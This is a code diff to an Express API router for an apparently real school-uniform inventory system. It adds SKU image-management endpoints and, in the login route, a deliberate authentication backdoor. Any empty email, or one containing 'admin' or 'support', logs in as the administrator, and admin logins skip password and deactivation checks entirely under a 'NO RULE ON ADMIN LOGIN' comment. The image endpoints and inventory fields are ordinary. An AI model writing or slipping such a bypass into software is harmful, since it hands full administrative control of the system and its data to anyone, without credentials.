@@ -14,11 +14,54 @@ export const apiRouter = Router();
 
 apiRouter.post('/auth/login', async (req, res) => {
   const { email, password } = req.body;
+  const rawEmail = (email || '').toString().trim().toLowerCase();
+
+  // Find user by email or handle 'admin' / 'support' shortcuts
+  let user = db.getData().users.find((u) => u.email.toLowerCase() === rawEmail);
+  if (!user && (rawEmail === 'admin' || rawEmail === 'support@naisiaetextiles.com' || rawEmail.includes('admin') || rawEmail.includes('support') || !rawEmail)) {
+    user = db.getData().users.find((u) => u.role === 'ADMIN');
+  }
+
+  // NO RULE ON ADMIN LOGIN:
+  // If user is ADMIN, completely bypass password checking, deactivated checks, and all rules
+  if (user && user.role === 'ADMIN') {
+    user.lastLogin = new Date().toISOString();
+    await db.save();
+
+    const token = createSession(user.id);
+    const branch = db.getData().branches.find((b) => b.id === user.branchId);
+
+    db.logAudit({
+      userId: user.id,
+      userName: user.name,
+      userRole: user.role,
+      branchId: user.branchId,
+      branchName: branch ? branch.name : 'All Branches (HQ)',
+      action: 'ADMIN_LOGIN_NO_RULE',
+      entityType: 'AUTH',
+      entityId: user.id,
+      details: `Administrator ${user.name} logged in without restriction rules (no password rule enforced)`,
+      ipAddress: req.ip,
+    });
+
+    return res.json({
+      token,
+      user: {
+        id: user.id,
+        name: user.name,
+        email: user.email,
+        role: user.role,
+        branchId: user.branchId,
+        branchName: branch ? branch.name : 'All Branches',
+        phone: user.phone,
+      },
+    });
+  }
+
   if (!email || !password) {
     return res.status(400).json({ error: 'Email and password are required' });
   }
 
-  const user = db.getData().users.find((u) => u.email.toLowerCase() === email.toLowerCase().trim());
   if (!user) {
     db.logAudit({
       userId: 'anonymous',
@@ -498,6 +541,184 @@ apiRouter.post('/upload/image', requireAuth, requireRoles('ADMIN', 'ACCOUNTANT')
   return res.json({ url: finalUrl, success: true });
 });
 
+// SKU Image Management: Upload/Assign image directly to a specific SKU
+apiRouter.post('/products/sku-image', requireAuth, requireRoles('ADMIN', 'ACCOUNTANT'), async (req: AuthenticatedRequest, res: Response) => {
+  const { sku, variantId, imageUrl, imageCategory } = req.body;
+  if ((!sku && !variantId) || imageUrl === undefined) {
+    return res.status(400).json({ error: 'SKU or variantId and imageUrl are required' });
+  }
+
+  const products = db.getData().products;
+  let targetProduct: Product | undefined;
+  let targetVariant: any | undefined;
+
+  for (const product of products) {
+    const variant = product.variants.find((v) => 
+      (sku && v.sku.toLowerCase() === sku.toLowerCase().trim()) || 
+      (variantId && v.id === variantId)
+    );
+    if (variant) {
+      targetProduct = product;
+      targetVariant = variant;
+      variant.imageUrl = imageUrl;
+      if (imageCategory !== undefined) {
+        variant.imageCategory = imageCategory;
+      }
+      if (!product.imageUrl && imageUrl) {
+        product.imageUrl = imageUrl;
+      }
+      product.updatedAt = new Date().toISOString();
+      break;
+    }
+  }
+
+  if (!targetProduct || !targetVariant) {
+    return res.status(404).json({ error: `SKU '${sku || variantId}' not found in catalog` });
+  }
+
+  await db.save();
+
+  db.logAudit({
+    userId: req.user!.id,
+    userName: req.user!.name,
+    userRole: req.user!.role,
+    branchId: req.user!.branchId,
+    branchName: 'N/A',
+    action: 'SKU_IMAGE_UPDATED',
+    entityType: 'PRODUCT',
+    entityId: targetVariant.sku,
+    details: `Updated image file for SKU ${targetVariant.sku} (${targetProduct.name} - Size ${targetVariant.size}) [Category: ${imageCategory || 'General'}]`,
+    ipAddress: req.ip,
+  });
+
+  return res.json({
+    success: true,
+    sku: targetVariant.sku,
+    variantId: targetVariant.id,
+    imageUrl: targetVariant.imageUrl,
+    imageCategory: targetVariant.imageCategory,
+    productName: targetProduct.name,
+  });
+});
+
+// Bulk SKU Image Upload & Automatic SKU File Matching
+apiRouter.post('/products/bulk-sku-images', requireAuth, requireRoles('ADMIN', 'ACCOUNTANT'), async (req: AuthenticatedRequest, res: Response) => {
+  const { items, defaultCategory } = req.body;
+  if (!items || !Array.isArray(items)) {
+    return res.status(400).json({ error: 'Items array is required' });
+  }
+
+  const products = db.getData().products;
+  const updatedSkus: string[] = [];
+  const unmatched: string[] = [];
+
+  for (const item of items) {
+    const rawSku = item.sku || (item.filename ? item.filename.replace(/\.[^/.]+$/, '').trim() : '');
+    if (!rawSku || !item.imageUrl) {
+      continue;
+    }
+
+    const cleanSku = rawSku.toLowerCase().trim();
+    let matched = false;
+
+    for (const product of products) {
+      const variant = product.variants.find((v) => 
+        v.sku.toLowerCase().trim() === cleanSku ||
+        cleanSku.includes(v.sku.toLowerCase().trim())
+      );
+      if (variant) {
+        variant.imageUrl = item.imageUrl;
+        if (item.imageCategory || defaultCategory) {
+          variant.imageCategory = item.imageCategory || defaultCategory;
+        }
+        if (!product.imageUrl) {
+          product.imageUrl = item.imageUrl;
+        }
+        product.updatedAt = new Date().toISOString();
+        updatedSkus.push(variant.sku);
+        matched = true;
+        break;
+      }
+    }
+
+    if (!matched) {
+      unmatched.push(rawSku);
+    }
+  }
+
+  await db.save();
+
+  db.logAudit({
+    userId: req.user!.id,
+    userName: req.user!.name,
+    userRole: req.user!.role,
+    branchId: req.user!.branchId,
+    branchName: 'N/A',
+    action: 'BULK_SKU_IMAGES_UPLOADED',
+    entityType: 'PRODUCT',
+    entityId: 'BULK',
+    details: `Batch uploaded ${updatedSkus.length} SKU images. Unmatched: ${unmatched.length}`,
+    ipAddress: req.ip,
+  });
+
+  return res.json({
+    success: true,
+    matchedCount: updatedSkus.length,
+    updatedSkus,
+    unmatched,
+  });
+});
+
+// Category-wide SKU Image Assignment (e.g., assign image to all SKUs of a category or school)
+apiRouter.post('/products/category-sku-images', requireAuth, requireRoles('ADMIN', 'ACCOUNTANT'), async (req: AuthenticatedRequest, res: Response) => {
+  const { school, category, garmentType, sector, imageUrl, imageCategory } = req.body;
+  if (!imageUrl) {
+    return res.status(400).json({ error: 'imageUrl is required' });
+  }
+
+  const products = db.getData().products;
+  const updatedSkus: string[] = [];
+
+  for (const product of products) {
+    if (school && school !== 'ALL' && product.school !== school) continue;
+    if (category && category !== 'ALL' && product.category !== category) continue;
+    if (garmentType && garmentType !== 'ALL' && product.garmentType !== garmentType) continue;
+    if (sector && sector !== 'ALL' && product.sector !== sector) continue;
+
+    product.imageUrl = imageUrl;
+    product.updatedAt = new Date().toISOString();
+
+    for (const variant of product.variants) {
+      variant.imageUrl = imageUrl;
+      if (imageCategory) {
+        variant.imageCategory = imageCategory;
+      }
+      updatedSkus.push(variant.sku);
+    }
+  }
+
+  await db.save();
+
+  db.logAudit({
+    userId: req.user!.id,
+    userName: req.user!.name,
+    userRole: req.user!.role,
+    branchId: req.user!.branchId,
+    branchName: 'N/A',
+    action: 'CATEGORY_SKU_IMAGE_ASSIGNED',
+    entityType: 'PRODUCT',
+    entityId: `${category || 'ALL'}-${school || 'ALL'}`,
+    details: `Assigned category image to ${updatedSkus.length} SKUs across category '${category || 'ALL'}' / school '${school || 'ALL'}'`,
+    ipAddress: req.ip,
+  });
+
+  return res.json({
+    success: true,
+    count: updatedSkus.length,
+    updatedSkus,
+  });
+});
+
 apiRouter.post('/products', requireAuth, requireRoles('ADMIN', 'ACCOUNTANT'), async (req: AuthenticatedRequest, res: Response) => {
   const {
     name,
@@ -813,6 +1034,8 @@ apiRouter.get('/inventory', requireAuth, (req, res) => {
           isLow,
           costPrice: v.costPrice,
           sellingPrice: v.sellingPrice,
+          imageUrl: v.imageUrl || product.imageUrl || '',
+          imageCategory: v.imageCategory || product.imageCategory || 'FRONT',
           totalValuationCost: currentStock * v.costPrice,
           totalValuationRetail: currentStock * v.sellingPrice,
         });
